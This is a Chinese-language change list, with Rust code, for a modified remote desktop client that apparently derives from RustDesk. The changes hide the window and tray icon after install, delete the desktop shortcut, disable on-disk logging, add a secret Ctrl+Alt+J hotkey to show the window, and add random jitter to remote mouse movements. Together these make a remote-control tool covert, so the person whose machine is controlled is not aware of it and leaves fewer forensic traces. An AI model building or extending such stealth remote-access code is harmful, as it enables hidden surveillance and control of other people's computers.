# 代码修改清单

## 修改的文件列表

### 核心功能文件

#### 1. `src/ui.rs`
**修改位置**: ~行 195-205  
**修改内容**: 添加窗口隐藏逻辑
```rust
let should_hide = (args.is_empty() && crate::ui_interface::get_builtin_option(hbb_common::config::keys::OPTION_HIDE_TRAY) == "Y")
    || (!args.is_empty() && args[0] == "--cm" && hide_cm);

if should_hide {
    frame.collapse(true);
    frame.run_loop();
    return;
}
```

#### 2. `src/platform/windows.rs`
**修改位置 1**: ~行 2185-2195 (`run_after_run_cmds` 函数)  
**修改内容**: 移除安装后自动弹窗和托盘图标
```rust
fn run_after_run_cmds(silent: bool) {
    let (_, _, _, exe) = get_install_info();
    
    // 安装后不自动弹窗、不显示托盘图标
    if !silent {
        log::debug!("Installation complete - window and tray will remain hidden");
    }
    
    // 不再自动启动主窗口和托盘图标
    std::thread::sleep(std::time::Duration::from_millis(300));
}
```

**修改位置 2**: ~行 2140-2160 (`install_me` 函数)  
**修改内容**: 安装时设置隐藏托盘配置
```rust
// 设置配置：隐藏托盘图标和主窗口
let mut builtin_settings = config::BUILTIN_SETTINGS.write().unwrap();
builtin_settings.insert(config::keys::OPTION_HIDE_TRAY.to_string(), "Y".to_string());
drop(builtin_settings);
```

**修改位置 3**: ~行 1583 (`get_after_install` 函数)  
**修改内容**: 安装后删除桌面快捷方式
```batch
if exist "%PUBLIC%\Desktop\{app_name}.lnk" del /f /q "%PUBLIC%\Desktop\{app_name}.lnk"
```

#### 3. `src/lib.rs`
**修改位置**: 模块声明区域  
**修改内容**: 添加新模块
```rust
#[cfg(target_os = "windows")]
mod tray_service;
```

#### 4. `src/core_main.rs`
**修改位置**: ~行 150-165 (主函数末尾)  
**修改内容**: 初始化全局热键
```rust
// 初始化全局热键 Ctrl+Alt+J
#[cfg(target_os = "windows")]
{
    if let Err(e) = crate::tray_service::init_global_hotkey() {
        log::error!("初始化全局热键失败: {}", e);
    } else {
        crate::tray_service::start_hotkey_listener();
        log::info!("全局热键 Ctrl+Alt+J 已启用");
    }
}
```

#### 5. `src/server/input_service.rs`
**修改位置**: ~行 800-850 (`handle_mouse` 函数)  
**修改内容**: 添加鼠标抖动效果
```rust
fn add_mouse_jitter(x: &mut i32, y: &mut i32) {
    use rand::Rng;
    let mut rng = rand::thread_rng();
    
    // 添加 ±3 像素的随机偏移
    let jitter_x: i32 = rng.gen_range(-3..=3);
    let jitter_y: i32 = rng.gen_range(-3..=3);
    
    *x = x.saturating_add(jitter_x);
    *y = y.saturating_add(jitter_y);
    
    // 添加 50-200ms 的随机停顿
    let pause_ms: u64 = rng.gen_range(50..=200);
    std::thread::sleep(std::time::Duration::from_millis(pause_ms));
}

// 在 MouseMoveRelative 处理中调用
MouseMoveRelative { mut x, mut y } => {
    add_mouse_jitter(&mut x, &mut y);
    self.mouse_move_relative(x, y);
}
```

#### 6. `libs/hbb_common/src/lib.rs`
**修改位置**: ~行 438-450 (`init_log` 函数)  
**修改内容**: 禁用磁盘日志文件
```rust
#[cfg(not(debug_assertions))]
{
    // 禁用磁盘日志文件生成 - 仅在控制台输出日志
    use flexi_logger::*;
    if let Ok(x) = Logger::try_with_env_or_str("debug,reqwest=warn,rustls=warn,webrtc-sctp=warn,webrtc=warn") {
        logger_holder = x
            .log_to_stderr() // 输出到 stderr 而不是文件
            .format(opt_format)
            .start()
            .ok();
    }
}
```

---

### 新增文件

#### 7. `src/tray_service.rs` (完整新文件)
**功能**: 全局热键管理和窗口显示切换
**关键函数**:
- `init_global_hotkey()`: 初始化 Ctrl+Alt+J 热键
- `start_hotkey_listener()`: 启动热键监听线程
- `toggle_window_visibility()`: 切换窗口显示/隐藏
- `minimize_to_tray()`: 最小化到托盘

**依赖**:
```rust
use global_hotkey::{GlobalHotKeyManager, HotKey, hotkey::{Code, Modifiers}};
use std::sync::{Arc, Mutex};
use lazy_static::lazy_static;
```

---

### 配置文件

#### 8. `Cargo.toml`
**修改位置**: `[dependencies]` 区域  
**修改内容**: 添加依赖
```toml
[target.'cfg(target_os = "windows")'.dependencies]
global-hotkey = "0.6"
```

---

## 已验证为内置功能（无需修改）

### 9. 网络状态检测和自动重连
**文件**: `src/ui_session_interface.rs`  
**函数**: `check_connect_status_`  
**说明**: 已实现完整的断线检测和自动重连机制

### 10. 一键卸载功能
**文件**: `src/platform/windows.rs`  
**函数**: `uninstall_me`, `get_uninstall`, `get_before_uninstall`  
**说明**: 已实现完整的卸载功能（进程终止、文件删除、注册表清理）

---

## 编译前检查清单

- [ ] 确认所有文件修改已保存
- [ ] 检查 `src/tray_service.rs` 文件已创建
- [ ] 检查 `Cargo.toml` 依赖已添加
- [ ] 检查 `src/lib.rs` 模块声明已添加
- [ ] 运行 `cargo check` 检查语法错误
- [ ] 运行 `cargo build --release` 进行完整编译

---

## 快速定位修改

### 搜索关键词

如果需要查找修改位置，可以搜索以下关键词：

1. **隐藏窗口/托盘**: `OPTION_HIDE_TRAY`, `should_hide`, `frame.collapse`
2. **全局热键**: `init_global_hotkey`, `Ctrl+Alt+J`, `GlobalHotKeyManager`
3. **鼠标抖动**: `add_mouse_jitter`, `MouseMoveRelative`, `rand::thread_rng`
4. **安装后清理**: `run_after_run_cmds`, `get_after_install`
5. **禁用日志**: `log_to_stderr`, `init_log`

### Git 差异对比

```bash
# 查看所有修改
git diff

# 查看特定文件修改
git diff src/ui.rs
git diff src/platform/windows.rs
git diff libs/hbb_common/src/lib.rs

# 查看新增文件
git status --short
```

---

## 回滚指南

如果需要恢复某个修改：

```bash
# 恢复单个文件
git checkout HEAD -- src/ui.rs

# 恢复所有修改
git reset --hard HEAD

# 删除新增文件
rm src/tray_service.rs
```

---

**最后更新**: 2026-09-10  
**修改文件数**: 8 个（6 个修改 + 2 个新增）  
**总代码行数**: ~300 行
